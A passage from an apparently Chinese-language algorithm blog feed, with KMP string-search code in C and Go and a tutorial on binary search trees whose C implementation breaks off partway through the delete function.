class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span>  </span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_LEN 100  </span></span><br><span class="line">  </span><br><span class="line"><span class="comment">// 本实现的`next[i]`定义为&quot;模式串`s`的子串`s[0,i-1]`(包括边界)的公共前后缀中, 前缀的后一个字符的下标(或称公共前后缀的长度)&quot;  </span></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_next</span><span class="params">(<span class="type">char</span> *pattern, <span class="type">int</span> *next)</span> &#123;  </span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;  </span><br><span class="line">    <span class="type">int</span> j = <span class="number">-1</span>;  </span><br><span class="line">    next[<span class="number">0</span>] = <span class="number">-1</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">while</span> (i &lt; <span class="built_in">strlen</span>(pattern)) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">-1</span> || pattern[i] == pattern[j]) &#123;  </span><br><span class="line">            next[++i] = ++j;  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            j = next[j];  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">kmp</span><span class="params">(<span class="type">char</span> *text, <span class="type">char</span> *pattern, <span class="type">int</span> *idxs)</span> &#123;  </span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, len = <span class="number">0</span>;  </span><br><span class="line">    <span class="type">int</span> *next = (<span class="type">int</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>) * (<span class="built_in">strlen</span>(pattern)+<span class="number">1</span>)); <span class="comment">// 注意这里数组长度要加1!  </span></span><br><span class="line">    <span class="type">size_t</span> pattern_len = <span class="built_in">strlen</span>(pattern);  </span><br><span class="line">    <span class="type">size_t</span> text_len = <span class="built_in">strlen</span>(text);  </span><br><span class="line">    get_next(pattern, next);  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 注意, 由于text_len和pattern_len的类型是size_t, 因此需要使用!=而不是&lt;  </span></span><br><span class="line">    <span class="keyword">while</span> (i != text_len &amp;&amp; j != pattern_len) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (j == <span class="number">-1</span> || text[i] == pattern[j]) &#123;  </span><br><span class="line">            i++;  </span><br><span class="line">            j++;  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            j = next[j];  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (j == pattern_len) &#123;  </span><br><span class="line">            idxs[len++] = i - j;  </span><br><span class="line">            j = next[j];  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="built_in">free</span>(next);  </span><br><span class="line">    <span class="keyword">return</span> len;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;  </span><br><span class="line">    <span class="type">char</span> text[MAX_LEN];  </span><br><span class="line">    <span class="type">char</span> pattern[MAX_LEN];  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// init  </span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, text);  </span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, pattern);  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// search  </span></span><br><span class="line">    <span class="type">int</span> idx[MAX_LEN];  </span><br><span class="line">    <span class="type">int</span> len = kmp(text, pattern, idx);  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// output  </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);  </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, idx[i]);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Golang:</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// 本实现的`next[i]`定义为&quot;模式串`s`的子串`s[0,i-1]`(包括边界)的公共前后缀中, 前缀的后一个字符的下标(或称公共前后缀的长度)&quot;  </span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getNext</span><span class="params">(pattern <span class="type">string</span>)</span></span> (next []<span class="type">int</span>) &#123;  </span><br><span class="line">    i, j := <span class="number">0</span>, <span class="number">-1</span>  </span><br><span class="line">    next = <span class="built_in">make</span>([]<span class="type">int</span>, <span class="built_in">len</span>(pattern)+<span class="number">1</span>) <span class="comment">// 注意这里next的长度要+1  </span></span><br><span class="line">    next[<span class="number">0</span>] = <span class="number">-1</span>  </span><br><span class="line">    <span class="keyword">for</span> i &lt; <span class="built_in">len</span>(pattern) &#123;  </span><br><span class="line">       <span class="keyword">if</span> j == <span class="number">-1</span> || pattern[i] == pattern[j] &#123;  </span><br><span class="line">          i++  </span><br><span class="line">          j++  </span><br><span class="line">          next[i] = j  </span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">          j = next[j]  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">kmp</span><span class="params">(text, pattern <span class="type">string</span>)</span></span> (res []<span class="type">int</span>) &#123;  </span><br><span class="line">    i, j := <span class="number">0</span>, <span class="number">0</span>  </span><br><span class="line">    next := getNext(pattern)  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">// 与C的strlen不同, len()返回的是有符号整数, 因此无需使用!=  </span></span><br><span class="line">    <span class="keyword">for</span> i &lt; <span class="built_in">len</span>(text) &amp;&amp; j &lt; <span class="built_in">len</span>(pattern) &#123;  </span><br><span class="line">       <span class="keyword">if</span> j == <span class="number">-1</span> || text[i] == pattern[j] &#123;  </span><br><span class="line">          i++  </span><br><span class="line">          j++  </span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">          j = next[j]  </span><br><span class="line">       &#125;  </span><br><span class="line">  </span><br><span class="line">       <span class="keyword">if</span> j == <span class="built_in">len</span>(pattern) &#123;  </span><br><span class="line">          res = <span class="built_in">append</span>(res, i-j)  </span><br><span class="line">          j = next[j]  </span><br><span class="line">       &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span>  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;  </span><br><span class="line">    <span class="keyword">var</span> text, pattern <span class="type">string</span>  </span><br><span class="line">    _, _ = fmt.Scanln(&amp;text)  </span><br><span class="line">    _, _ = fmt.Scanln(&amp;pattern)  </span><br><span class="line">  </span><br><span class="line">    idx := kmp(text, pattern)  </span><br><span class="line">    <span class="keyword">for</span> i, v := <span class="keyword">range</span> idx &#123;  </span><br><span class="line">       <span class="keyword">if</span> i != <span class="number">0</span> &#123;  </span><br><span class="line">          fmt.Print(<span class="string">&quot; &quot;</span>)  </span><br><span class="line">       &#125;  </span><br><span class="line">       fmt.Print(v)  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二叉搜索树</title>
      <link href="/202465bf6a93a9ff/"/>
      <url>/202465bf6a93a9ff/</url>
      
        <content type="html"><![CDATA[<h1 id="概述">概述</h1><p><code>查找问题</code>是计算机中非常重要的基础问题，在查找时，还经常需要支持<code>插入</code>和<code>删除</code>，通常这一问题的方法有：</p><table><thead><tr><th>数据结构</th><th>查找</th><th>插入</th><th>删除</th></tr></thead><tbody><tr><td>无序数组</td><td>O(n)</td><td>O(n)</td><td>O(n)</td></tr><tr><td>有序数组</td><td>O(logn)</td><td>O(n)</td><td>O(n)</td></tr></tbody></table><p>尽管使用有序数组可以将查找操作优化到<code>O(logn)</code>，但是在插入和删除时仍然为<code>O(n)</code>。</p><p>使用二叉搜索树可以将三种操作均优化到<code>O(logn)</code>。<br>一颗二叉搜索树（Binary Search Tree）满足以下性质：</p><ul><li>他是一颗二叉树</li><li>左子树上所有节点的值都小于其根节点的值</li><li>右子树上所有节点的值都大于其根节点的值</li></ul><p>须要注意的是，二叉搜索树中不允许出现重复值。<br>此外，根据其性质，容易知道二叉搜索树的子树也是二叉搜索树。例如，下面这棵树就是一个二叉搜索树：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240523182248.png" alt="image.png|380"><br>而这棵树则不是二叉搜索树：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240523182338.png" alt="image.png|388"></p><h1 id="复杂度分析">复杂度分析</h1><p>二叉搜索树在平均情况下，即树保持相对平衡（其左右子树的高度接近）的情况下，插入、删除、操作均为<code>O(logn)</code>，因为此时的树高度接近<code>log(n)</code>，向下搜索的深度不会超过树的高度。</p><p>但是，二叉搜索树在极端情况下，会退化为链表，这种情况发生在顺序插入的数据已经有序的情况下，此时的树是一棵左斜树/右斜树，即只有左子树/右子树：<br><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/20240523183303.png" alt="image.png|475"><br>此时的BSTree高度为<code>n</code>，三种操作均退化为<code>O(n)</code>。</p><p>因此在实际应用中，使用平衡树来优化会有更好的效果。</p><h1 id="三种操作">三种操作</h1><h2 id="查找操作">查找操作</h2><p>很简单，从根节点开始向下迭代寻找key值，有四种情况：</p><ul><li>如果当前节点值大于key，则继续搜索左子树</li><li>如果当前节点值小于key，则继续搜搜右子树</li><li>如果当前节点值等于key，则找到该值，查找成功</li><li>如果当前节点为空（NULL），则该值不存在，查找失败</li></ul><h2 id="插入操作">插入操作</h2><p>同样需要查找，从根节点开始向下根据key值进行迭代，有四种情况：</p><ul><li>如果当前节点值大于key，则继续迭代左子树</li><li>如果当前节点值小于key，则继续迭代右子树</li><li>如果当前节点值等于key，则该值已存在，插入失败</li><li>如果当前节点为空（NULL），则该值不存在，并找到了空位，在此处创建新节点插入key，插入成功</li></ul><h2 id="删除操作">删除操作</h2><p>删除稍复杂些，因为删除节点后必须保证树不断开，并且保持二叉搜索树的性质。<br>同样需要查找，从根节点开始向下根据key值进行迭代，有四种情况：</p><ul><li>如果当前节点值大于key，则继续迭代左子树</li><li>如果当前节点值小于key，则继续迭代右子树</li><li>如果当前节点值等于key，则找到该值，此时进行删除，删除成功</li><li>如果当前节点为空（NULL），则该值不存在，删除失败</li></ul><p>删除结点N的方法：</p><ol><li>如果N为叶子节点，则直接将其删除即可</li><li>如果N只有一个子节点（无论左右），则将该子节点直接替换掉N即可</li><li>如果N有两个子节点，那么此时有2种方法，选择其一即可：<ol><li>找到N的右子树中的最小节点N2，替换掉N节点；然后，删除该最小节点</li><li>找到N的左子树中的最大节点N2，替换掉N节点；然后，删除该最大节点</li></ol></li></ol><h1 id="代码实现">代码实现</h1><h2 id="c语言实现">C语言实现</h2><p>该代码使用链表来存储二叉树。<br>BSTree.h:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  </span></span><br><span class="line"><span class="comment">// Created by WAHAHA on 2023/10/18.  </span></span><br><span class="line"><span class="comment">//  </span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> ADT_BSTREE_H  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADT_BSTREE_H  </span></span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> bool int  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> true 1  </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> false 0  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> TreeElementType;  </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> &#123;</span>  </span><br><span class="line">    TreeElementType value;  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> *<span class="title">left</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> *<span class="title">right</span>;</span>  </span><br><span class="line">&#125; TreeNode;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span>  </span><br><span class="line">    TreeNode *root;  </span><br><span class="line">    <span class="type">int</span> size;  </span><br><span class="line">&#125; BSTree_t, *BSTree;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// create and destroy  </span></span><br><span class="line">BSTree <span class="title function_">newBSTree</span><span class="params">(<span class="type">void</span>)</span>;  </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">destroyTreeRun</span><span class="params">(TreeNode *node)</span>;  </span><br><span class="line"><span class="type">void</span> <span class="title function_">destroyBSTree</span><span class="params">(BSTree T)</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// check status  </span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isEmptyTree</span><span class="params">(BSTree T)</span>;  </span><br><span class="line"><span class="type">int</span> <span class="title function_">treeSize</span><span class="params">(BSTree T)</span>;  </span><br><span class="line">TreeElementType <span class="title function_">findMin</span><span class="params">(BSTree T)</span>;  </span><br><span class="line">TreeElementType <span class="title function_">findMax</span><span class="params">(BSTree T)</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// operations  </span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">find</span><span class="params">(BSTree T, TreeElementType key)</span>;  </span><br><span class="line"><span class="type">bool</span> <span class="title function_">insert</span><span class="params">(BSTree T, TreeElementType value)</span>;  </span><br><span class="line"><span class="type">bool</span> <span class="title function_">delete</span><span class="params">(BSTree T, TreeElementType value)</span>;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//ADT_BSTREE_H</span></span></span><br></pre></td></tr></table></figure><p>BSTree.c:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;BSTree.h&quot;</span>  </span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// create and destroy  </span></span><br><span class="line">BSTree <span class="title function_">newBSTree</span><span class="params">(<span class="type">void</span>)</span> &#123;  </span><br><span class="line">    BSTree T = (BSTree) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BSTree_t));  </span><br><span class="line">    <span class="keyword">if</span> (T == <span class="literal">NULL</span>) &#123;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error: create tree failed.\n&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    T-&gt;root = <span class="literal">NULL</span>;  </span><br><span class="line">    T-&gt;size = <span class="number">0</span>;  </span><br><span class="line">    <span class="keyword">return</span> T;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">destroyTreeRun</span><span class="params">(TreeNode *node)</span> &#123;  </span><br><span class="line">    <span class="keyword">if</span> (node == <span class="literal">NULL</span>) &#123;  </span><br><span class="line">        <span class="keyword">return</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    destroyTreeRun(node-&gt;left);  </span><br><span class="line">    destroyTreeRun(node-&gt;right);  </span><br><span class="line">    <span class="built_in">free</span>(node);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="type">void</span> <span class="title function_">destroyBSTree</span><span class="params">(BSTree T)</span> &#123;  </span><br><span class="line">    destroyTreeRun(T-&gt;root);  </span><br><span class="line">    <span class="built_in">free</span>(T);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// check status  </span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">isEmptyTree</span><span class="params">(BSTree T)</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> T-&gt;size == <span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">treeSize</span><span class="params">(BSTree T)</span> &#123;  </span><br><span class="line">    <span class="keyword">return</span> T-&gt;size;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">TreeElementType <span class="title function_">findMin</span><span class="params">(BSTree T)</span> &#123;  </span><br><span class="line">    TreeNode *p = T-&gt;root;  </span><br><span class="line">    <span class="keyword">while</span> (p-&gt;left != <span class="literal">NULL</span>) &#123;  </span><br><span class="line">        p = p-&gt;left;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> p-&gt;value;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">TreeElementType <span class="title function_">findMax</span><span class="params">(BSTree T)</span> &#123;  </span><br><span class="line">    TreeNode *p = T-&gt;root;  </span><br><span class="line">    <span class="keyword">while</span> (p-&gt;right != <span class="literal">NULL</span>) &#123;  </span><br><span class="line">        p = p-&gt;right;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> p-&gt;value;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="comment">// operations  </span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">insert</span><span class="params">(BSTree T, TreeElementType value)</span> &#123;  </span><br><span class="line">    TreeNode *node = (TreeNode *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(TreeNode));  </span><br><span class="line">    <span class="keyword">if</span> (node == <span class="literal">NULL</span>) &#123;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error: create node failed.\n&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    node-&gt;value = value;  </span><br><span class="line">    node-&gt;left = <span class="literal">NULL</span>;  </span><br><span class="line">    node-&gt;right = <span class="literal">NULL</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (T-&gt;root == <span class="literal">NULL</span>) &#123;  </span><br><span class="line">        T-&gt;root = node;  </span><br><span class="line">        T-&gt;size++;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    TreeNode *p = T-&gt;root;  </span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (value &lt; p-&gt;value) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (p-&gt;left == <span class="literal">NULL</span>) &#123;  </span><br><span class="line">                p-&gt;left = node;  </span><br><span class="line">                T-&gt;size++;  </span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">            &#125;  </span><br><span class="line">            p = p-&gt;left;  </span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value &gt; p-&gt;value) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (p-&gt;right == <span class="literal">NULL</span>) &#123;  </span><br><span class="line">                p-&gt;right = node;  </span><br><span class="line">                T-&gt;size++;  </span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">            &#125;  </span><br><span class="line">            p = p-&gt;right;  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Error: value %d already exists.\n&quot;</span>, value);  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="type">bool</span> <span class="title function_">delete</span><span class="params">(BSTree T, TreeElementType value)</span> &#123;  </span><br><span class="line">    TreeNode *p = T-&gt;root;  </span><br><span class="line">    TreeNode *parent = <span class="literal">NULL</span>;  </span><br><span class="line">    <span class="comment">// find the node to delete  </span></span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (value &lt; p-&gt;value) &#123;  </span><br><span class="line">            parent = p;  </span><br><span class="line">            p = p-&gt;left;  </span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (value &gt; p-&gt;value) &#123;  </span><br><span class="line">            parent = p;  </span><br><span class="line">            p = p-&gt;right;  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            <span class="keyword">break</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">// if not found  </span></span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>) &#123;  </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error: value %d not found.\n&quot;</span>, value);  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* case 1: p is a leaf node */</span>  </span><br><span class="line">    <span class="keyword">if</span> (p-&gt;left == <span class="literal">NULL</span> &amp;&amp; p-&gt;right == <span class="literal">NULL</span>) &#123;  </span><br><span class="line">        <span class="keyword">if</span> (parent == <span class="literal">NULL</span>) &#123;  </span><br><span class="line">            T-&gt;root = <span class="literal">NULL</span>; <span class="comment">// the tree becomes empty  </span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (parent-&gt;left == p) 